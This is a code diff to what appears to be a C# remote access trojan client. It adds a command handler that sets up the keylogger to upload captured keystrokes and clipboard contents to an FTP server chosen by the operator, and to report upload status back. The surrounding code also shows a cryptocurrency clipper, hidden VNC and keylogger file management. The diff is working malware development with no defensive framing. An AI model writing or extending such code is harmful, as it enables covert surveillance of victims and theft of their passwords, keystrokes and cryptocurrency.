@@ -924,6 +924,21 @@ internal class TlsClient : IDisposable
                     if (klDf != null) KeyloggerFeature.DeleteFile(klDf.Filename);
                     break;
 
+                case PacketType.KeyloggerFtpConfig:
+                    var ftpCfg = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.KeyloggerFtpConfigStub);
+                    if (ftpCfg != null)
+                        KeyloggerFeature.SetFtpConfig(
+                            ftpCfg.FtpHost, ftpCfg.FtpPort, ftpCfg.FtpUser, ftpCfg.FtpPass,
+                            ftpCfg.FtpPath, ftpCfg.MaxSizeKb, ftpCfg.ClipboardEnabled,
+                            async (evt, fn, msg, att) => await WritePacketAsync(new Packet
+                            {
+                                Type = PacketType.KeyloggerFtpStatus,
+                                Data = JsonSerializer.Serialize(
+                                    new KeyloggerFtpStatusStub { Event = evt, Filename = fn, Message = msg, Attempt = att },
+                                    SeroJson.Default.KeyloggerFtpStatusStub)
+                            }, CancellationToken.None));
+                    break;
+
                 // ── Crypto Clipper ────────────────────────────────────
                 case PacketType.ClipperSetConfig:
                     var clipCfg = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.ClipperSetConfigStub);
@@ -2263,6 +2278,8 @@ internal enum PacketType
     KeyloggerGetFile     = 177,
     KeyloggerFileContent = 178,
     KeyloggerDeleteFile  = 179,
+    KeyloggerFtpConfig   = 184,
+    KeyloggerFtpStatus   = 185,
 
     TikTokComment      = 210,
     TikTokCommentAck   = 211,
@@ -2541,6 +2558,8 @@ internal class HvncProgressDataStub
 [JsonSerializable(typeof(KeyloggerGetFileStub))]
 [JsonSerializable(typeof(KeyloggerFileContentStub))]
 [JsonSerializable(typeof(List<KeyloggerFileInfo>))]
+[JsonSerializable(typeof(KeyloggerFtpConfigStub))]
+[JsonSerializable(typeof(KeyloggerFtpStatusStub))]
 // Crypto Clipper
 [JsonSerializable(typeof(ClipperSetConfigStub))]
 [JsonSerializable(typeof(ClipperConfig))]
